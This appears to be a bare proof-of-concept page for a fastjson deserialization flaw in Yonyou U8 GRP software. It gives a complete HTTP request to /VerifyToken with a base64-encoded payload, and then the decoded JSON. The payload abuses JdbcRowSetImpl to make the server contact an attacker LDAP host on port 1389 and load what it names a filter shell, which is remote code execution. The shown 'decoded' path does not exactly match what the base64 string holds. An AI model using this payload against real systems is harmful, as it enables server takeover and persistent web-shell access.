## 用友U8GRP-fastjson


## poc
```
POST /VerifyToken HTTP/1.1
Host: xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 322

PARAM=eyJuYW1lIjp7IkB0eXBlIjoiamF2YS5sYW5nLkNsYXNzIiwidmFsIjoiY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGwifSwieCI6eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIiwiZGF0YVNvdXJjZU5hbWUiOiJsZGFwOi8veHh4eHg6MTM4OS9EZXNlcmlhbGl6YXRpb24vZmFzdGpzb24xL215dG9tY2F0bWVtZmlsdGVyc2hlbGwiLCJhdXRvQ29tbWl0Ijp0cnVlfX0=
```

base64内容
```
{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxxxx:1389/Deserialization/fastjson1/filtershell","autoCommit":true}}
```
